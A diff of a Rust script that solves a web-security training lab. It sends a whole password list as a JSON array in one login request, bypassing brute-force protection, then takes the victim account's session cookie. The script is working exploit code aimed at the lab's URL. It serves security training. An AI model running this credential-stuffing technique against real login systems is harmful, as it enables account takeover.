@@ -1,119 +1,77 @@
 /*************************************************************************
 *
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 30/8/2023
-*
 * Lab: Broken brute-force protection, multiple credentials per request
 *
-* Steps: 1. Send multiple passwords in the same login request
-*        2. Obtain the new session from cookie header
-*        3. Login as carlos with the new session
+* Hack Steps: 
+*      1. Read password list
+*      2. Send multiple passwords in the same request
+*      3. Get the session cookie of carlos
+*      4. Fetch carlos profile
 *
 **************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
 use regex::{self, Regex};
 use reqwest::{
-    blocking::{Client, ClientBuilder},
-    header::HeaderMap,
+    blocking::{Client, ClientBuilder, Response},
     redirect::Policy,
 };
-use std::{
-    collections::HashMap,
-    fs::{self, OpenOptions},
-    io::{self, Write},
-    time::{self, Duration, Instant},
-};
+use std::{fs, time::Duration};
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a9f0030040ef4de8aab3c820058007e.web-security-academy.net";
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0a9f00c6044016e682f0157a00ad0046.web-security-academy.net";
+    print!("⦗1⦘ Reading password list.. ");
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
+    let password_list = read_password_list("../passwords.txt"); // Make sure the file exist in your root directory or change its path accordingly
 
-    // read passwords as one big string
-    // change the path your passwords list
-    let passwords_as_string = fs::read_to_string("/home/ahmed/passwords").unwrap();
+    println!("{}", "OK".green());
+    print!("⦗2⦘ Sending multiple passwords in the same request.. ");
 
-    // split the big string to a list of passwords
-    // change \n to \r\n if you still a windows user
-    let passwords: Vec<&str> = passwords_as_string.split("\n").collect();
-
-    // send multiple passwords in one request
-    let send_passwords = client
-        .post(format!("{url}/login"))
+    let web_client = build_web_client();
+    let login_with_multiple_passwords = web_client
+        .post(format!("{LAB_URL}/login"))
         .header("Content-Type", "application/json")
         .body(format!(
             "{{\"username\": \"carlos\", \"password\": {:?}}}",
-            passwords
+            password_list
         ))
-        .send();
-
-    // if the request is successful
-    if let Ok(res) = send_passwords {
-        println!(
+        .send()
+        .expect(&format!(
             "{}",
-            "[*] Sending multiple passwords in the same request..OK"
-                .white()
-                .bold()
-        );
+            "⦗!⦘ Failed to send multiple passwords in the same request".red()
+        ));
 
-        // if a redirect happens; means that a valid password exist
-        if res.status().as_u16() == 302 {
-            // extract the session from cookie header
-            let session = extract_session_cookie(res.headers());
+    println!("{}", "OK".green());
 
-            // try to get home page with the new session
-            let home = client
-                .get(format!("{url}/my-account?id=carlos"))
-                .header("Cookie", format!("session={session}"))
-                .send();
+    if login_with_multiple_passwords.status().as_u16() == 302 {
+        print!("⦗3⦘ Getting the session cookie of carlos.. ");
 
-            // if you get the home page successfully
-            if let Ok(home_res) = home {
-                // body of the home page
-                let home_body = home_res.text().unwrap();
+        let session = get_session_cookie(&login_with_multiple_passwords);
 
-                // pattern to search for
-                let carlos_pattern = Regex::new("Your username is: carlos").unwrap();
+        println!("{}", "OK".green());
+        print!("⦗4⦘ Fetching carlos profile.. ");
 
-                // search for pattern to make sure that you logged in as carlos
-                let is_carlos = carlos_pattern.find(&home_body).unwrap();
+        web_client
+            .get(format!("{LAB_URL}/my-account?id=carlos"))
+            .header("Cookie", format!("session={session}"))
+            .send()
+            .expect(&format!("{}", "⦗!⦘ Failed to fetch carlos profile".red()));
 
-                // if the pattern is found
-                if is_carlos.len() != 0 {
-                    println!(
-                        "{} {}",
-                        "✅ Successfully logged in as".white().bold(),
-                        "carlos".green().bold()
-                    );
-                    println!(
-                        "{} {} {}",
-                        "Use this".white().bold(),
-                        session.green().bold(),
-                        "session in your browser to login as carlos".white().bold()
-                    );
-                }
-            }
-        }
+        println!("{}", "OK".green());
+        println!("🗹 The lab should be marked now as {}", "solved".green());
     } else {
-        println!("{}", "[!] Failed to issue login request".red().bold())
+        println!("{}", "⦗!⦘ There is no valid password".red())
     }
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn read_password_list(file_path: &str) -> Vec<String> {
+    let passwords_big_string = fs::read_to_string(file_path)
+        .expect(&format!("Failed to read the file: {}", file_path.red()));
+    passwords_big_string.lines().map(|p| p.to_owned()).collect()
+}
+
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -121,24 +79,17 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/*******************************************************************
-* Function to extract session field from the cookie header
-********************************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> String {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    extract_pattern("session=(.*); Secure", cookie)
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*);", cookie_header)
 }
 
-/****************************************************
-* Function to extract a pattern form a text
-*****************************************************/
-fn extract_pattern(pattern: &str, text: &str) -> String {
-    Regex::new(pattern)
-        .unwrap()
-        .captures(text)
-        .unwrap()
-        .get(1)
-        .unwrap()
-        .as_str()
-        .to_string()
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
 }
